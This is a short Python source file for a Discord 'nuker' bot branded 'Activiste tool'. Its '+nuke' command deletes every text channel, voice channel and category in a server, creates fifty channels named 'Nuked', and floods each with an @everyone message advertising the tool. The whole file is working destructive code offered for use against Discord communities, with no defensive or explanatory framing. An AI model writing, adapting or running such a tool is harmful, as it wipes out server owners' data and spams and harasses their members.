import discord
from discord.ext import commands
ActivisteTools = commands.Bot(command_prefix='+')
message = '@everyone Nuked By Activiste tool ! https://github.com/ActivisteNuker'
@ActivisteTools.event
async def on_ready():
 await ActivisteTools.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name="github.com/activiste"))  
@ActivisteTools.command()
async def nuke(ctx):
    for channel in ctx.guild.text_channels:
         await channel.delete()
    for channel in ctx.guild.voice_channels:
         await channel.delete()
    for category in ctx.guild.categories:
         await category.delete()
    guild = ctx.guild
    for i in range(50):
         await guild.create_text_channel(f'Nuked-{i+1}')
    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel):
         await channel.send(message)
ActivisteTools.run('TOKEN-DISCORD')
